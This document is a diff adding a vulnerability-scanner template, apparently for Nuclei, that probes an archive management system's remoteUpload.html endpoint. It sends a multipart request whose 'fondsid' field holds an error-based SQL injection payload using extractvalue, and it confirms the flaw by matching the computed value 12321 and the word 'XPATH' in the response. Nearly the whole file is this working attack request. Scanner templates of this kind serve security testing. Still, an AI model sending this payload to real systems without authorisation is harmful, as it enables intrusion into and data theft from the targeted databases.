@@ -1,0 +1,56 @@
+id: msk-template
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        POST /Archive/ErecordManage/remoteUpload.html?token HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.20(0x18001442)
+        Content-Length: 769
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: multipart/form-data; boundary=cc363856508c37f89af87f66486f3e1c
+
+        --cc363856508c37f89af87f66486f3e1c
+        Content-Disposition: form-data; name="userID"
+
+        admin
+        --cc363856508c37f89af87f66486f3e1c
+        Content-Disposition: form-data; name="fondsid"
+
+        111111' or 1=1 and (select extractvalue(1,concat('~',(select 111*111)))) --+'
+        --cc363856508c37f89af87f66486f3e1c
+        Content-Disposition: form-data; name="comid"
+
+        100000
+        --cc363856508c37f89af87f66486f3e1c
+        Content-Disposition: form-data; name="token"
+
+        900000
+        --cc363856508c37f89af87f66486f3e1c
+        Content-Disposition: form-data; name="archtypeid"
+
+        9000000
+        --cc363856508c37f89af87f66486f3e1c
+        Content-Disposition: form-data; name="tableid"
+
+        9000000
+        --cc363856508c37f89af87f66486f3e1c
+        Content-Disposition: form-data; name="archid"
+
+        9000000
+        --cc363856508c37f89af87f66486f3e1c--
+                --cc363856508c37f89af87f66486f3e1c--
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"12321","XPATH")
